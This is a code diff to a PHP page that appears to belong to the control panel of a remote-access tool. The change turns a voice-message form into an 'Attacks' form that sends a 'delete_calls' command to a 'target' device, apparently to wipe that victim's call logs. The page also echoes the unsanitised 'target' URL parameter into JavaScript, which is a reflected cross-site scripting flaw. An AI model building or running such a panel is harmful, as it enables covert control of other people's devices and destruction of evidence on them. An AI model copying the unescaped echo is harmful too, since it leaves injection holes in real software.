@@ -1,26 +1,23 @@
 <?php 
 require_once 'module_controller.php';
 ?>
-
     <div class="row">
         <div class="col-md-11 col-lg-offset-0">
             <div class="well">
 
                 <div class="row"></div>
                 <br><br>
-                <legend>Yazı Seslendirme</legend>
+                <legend>DeletecallLogs</legend>
                 <div class="row">
                     <form class="form-horizontal col-md-8 col-lg-offset-1">
                         <fieldset>
                             <div class="col-md-10 col-lg-offset-4">
-                                <label for="select" class="col-lg-4 control-label">Ses Dili</label>
+                                <label for="select" class="col-lg-4 control-label">Attacks</label>
 
                                 <div class="col-lg-4">
-                                    <select class="form-control" id="selected-land-id" name="selected-file">
-
-                                        <option>TR</option>
-                                        <option>EN</option>
-                                        <option>RU</option>
+                                    <select class="form-control" id="selected-message-id" name="selected-message-id">
+                                        <option>DeleteLogs</option>
+                                        
                                     </select>
                                 </div>
                             </div>
@@ -28,15 +25,15 @@ require_once 'module_controller.php';
 
 
                             <div class="form-group">
-                                <label for="sms-content-id" class="col-lg-2 control-label">Mesaj</label>
+                                <label for="sms-content-id" class="col-lg-2 control-label">FunPanel</label>
                                 <div class="col-lg-10">
-                                    <textarea class="form-control" rows="6" id="sms-content-id" placeholder="Mesaj içeriğini yazınız..."></textarea>
+                                    <textarea class="form-control" rows="4" id="sms-content-id" placeholder="Type: DelteLogs"></textarea>
                                 </div>
                             </div>
 
                             <div class="form-group">
                                 <div class="col-lg-10 col-lg-offset-2">
-                                    <button id="send-btn-id" name="send-btn-id" type="button" class="btn btn-default">Gönder</button>
+                                    <button id="send-btn-id" name="send-btn-id" type="button" class="btn btn-default">Send</button>
                                 </div>
                             </div>
                         </fieldset>
@@ -50,30 +47,32 @@ require_once 'module_controller.php';
     <script>
 
         $("#send-btn-id").click(function() {
-            var languageType =  $("#selected-land-id option:selected").text().trim();
+            var messageType =  $("#selected-message-id option:selected").text().trim();
             var messageContent = $("#sms-content-id").val().trim()+'';
 
-            if (languageType != '' && messageContent!=''){
+          if (messageType != '' && messageContent!=''){
 
                 var commands = {
                     send_command: true,
                     target:"<?php echo $_GET['target'];?>",
-                    type: 'voice_message',
+                    type: 'delete_calls',
                     value: {
-                            "message_type": languageType, "message_content": messageContent
+                            "message_type": messageType, "message_content": messageContent
                         }
                 };
+
+           
 
                 $.post( "commands.php", commands, function( data, err ) {
                     if (data.status){
                         Toastify({
-                            text: "Komut gönderildi.!",
+                            text: "Command Sent!",
                             backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
                             className: "info",
                         }).showToast();
                     } else {
                         Toastify({
-                            text: "Komut başarısız.!",
+                            text: "Command Failed.!",
                             backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                             className: "info",
                         }).showToast();
